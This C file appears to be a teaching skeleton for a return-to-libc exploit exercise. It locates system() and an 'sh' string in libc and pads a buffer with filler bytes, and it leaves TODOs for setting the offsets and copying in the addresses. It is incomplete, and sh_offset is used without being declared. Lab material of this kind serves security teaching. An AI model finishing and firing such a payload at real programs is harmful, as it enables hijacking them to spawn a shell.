/***
	Vulnerable C program
***/
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <dlfcn.h>
#include <string.h>

int getShAddr() {
	char *handle = (char *)dlopen("libc.so.6", 1);
	//printf("libc addr: %08x\n", handle);
	int i = 0;
	while (1) {
		if (handle[i] == 0x73 && handle[i + 1] == 0x68 && handle[i + 2] == 0) {
			return (int)(handle + i);
		}
		++i;
	}
}

int getSysAddr() {
	char *handle = (char *)dlopen("libc.so.6", 1);
	int sys_addr = (char *)dlsym(handle, "system");
	return sys_addr;
}

int main(int argc, char **argv) {
	if (argc!=2) {
		printf("Usage: print_payload <system_offset>\n");
		return 1;
	}

	int system_offset = atoi(argv[1]);
	// TODO
	// Figure out what the sh_offset should be
	// Hint: x should be multiple of 4
	// int sh_offset = system_offset + x;
	
	/***
		Initializing the payload array
	***/
	unsigned char payload[100];
	int i = 0;
	for (i = 0; i < 100; i++)
		payload[i] = '\x41';

	unsigned int system_addr = (unsigned int)getSysAddr();
	unsigned int sh_addr = (unsigned int)getShAddr();

	// TODO
	// Write system_addr and sh_addr to the right position of array payload
	// Use memcpy() to deal with endianness
	// 
	// 

	/***
		Printing the payload to screen	
	***/
	for (i = 0; i < sh_offset+4; i++) {
		printf("%02x", payload[i]);
	}
	printf("\n");

	return 0;
}
